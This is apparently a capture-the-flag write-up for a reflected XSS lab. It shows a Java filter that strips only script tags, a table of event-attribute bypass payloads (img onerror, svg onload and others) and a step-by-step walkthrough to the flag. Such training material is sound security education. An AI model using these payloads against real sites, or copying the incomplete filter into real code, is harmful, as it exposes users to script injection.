# Level 1 — Reflected XSS

## Challenge Description

This challenge simulates a product search feature. The backend applies simple `<script>` tag filtering but does not filter other HTML event attributes (like `onerror`, `onload`). Attackers can craft XSS payloads that bypass the filter.

**Objective**: Craft an XSS payload that bypasses `<script>` filtering, triggers an alert or JavaScript execution, and captures the Flag.

## Vulnerability Analysis

**Filtering Logic**:

```java
// Only filters script tags (case-insensitive)
String filteredQuery = query.replaceAll("(?i)</?script[^>]*>", "");
```

**Vulnerability**: Only `<script>` tags are filtered; `<img>`, `<svg>`, `<iframe>` and their event attributes are not.

### Valid Payloads

| Payload | Principle |
|---------|-----------|
| `"><img src=x onerror=alert(1)>` | img tag + onerror event |
| `"><svg onload=alert(1)>` | svg tag + onload event |
| `"><input onfocus=alert(1) autofocus>` | input tag + auto-focus |
| `"><details open ontoggle=alert(1)>` | details tag + ontoggle |

## Walkthrough

### Step 1: Test Basic Input

Enter normal text and observe how the search term is displayed.

### Step 2: Try `<script>` Tag

Enter `<script>alert(1)</script>` — observe that `<script>` tags are filtered.

### Step 3: Bypass Filter

Use a payload that doesn't rely on `<script>`, such as `"><img src=x onerror=alert(1)>`

### Step 4: Capture the Flag

When the payload matches a valid pattern, the response includes the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/xss/ReflectedXssController.java` | Backend search endpoint, incomplete filtering |
| `service/FlagService.java` | Flag retrieval and validation |
